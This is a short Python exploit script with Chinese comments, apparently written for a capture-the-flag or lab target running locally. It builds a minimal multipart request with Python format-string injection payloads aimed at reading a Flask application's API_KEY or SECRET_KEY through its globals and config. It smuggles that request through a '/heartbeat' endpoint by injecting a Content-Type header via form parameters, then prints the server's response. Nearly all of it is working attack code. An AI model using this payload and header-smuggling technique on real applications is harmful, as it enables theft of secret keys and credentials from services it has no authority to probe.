import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "-B"  # 使用最短的 boundary

# 构造最短的 multipart payload
# 需要包含：
# --BOUNDARY\r\n
# Content-Disposition: form-data; name="content"\r\n\r\n
# PAYLOAD\r\n
# --BOUNDARY\r\n
# Content-Disposition: form-data; name="action"\r\n\r\n
# {"type":"debug"}\r\n
# --BOUNDARY--

# 尝试极简版本
payload = '{0.view_functions[action].__globals__[API_KEY]}'

# 计算长度
part1 = f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="content"\r\n\r\n{payload}\r\n'
part2 = f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="action"\r\n\r\n{{"type":"debug"}}\r\n--{BOUNDARY}--'

full = part1 + part2
print(f"Payload length: {len(full)}")
print(f"Payload:\n{full}")

if len(full) <= 300:
    params = {
        'text': full,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    try:
        r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=5.0)
        print(f"\nStatus: {r.status_code}")
        print(f"Response: {r.text}")
    except Exception as e:
        print(f"Error: {e}")
else:
    print(f"\nPayload too long ({len(full)} > 300), need to shorten")
    
    # 尝试更短的 format string payload
    short_payload = '{0.config[SECRET_KEY]}'  # 更短的 payload
    part1_short = f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="content"\r\n\r\n{short_payload}\r\n'
    part2_short = f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="action"\r\n\r\n{{"type":"debug"}}\r\n--{BOUNDARY}--'
    full_short = part1_short + part2_short
    print(f"\nShorter payload length: {len(full_short)}")
    
    if len(full_short) <= 300:
        params = {
            'text': full_short,
            'client': 'Content-Type',
            'token': f'multipart/form-data; boundary={BOUNDARY}'
        }
        try:
            r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=5.0)
            print(f"Status: {r.status_code}")
            print(f"Response: {r.text}")
        except Exception as e:
            print(f"Error: {e}")
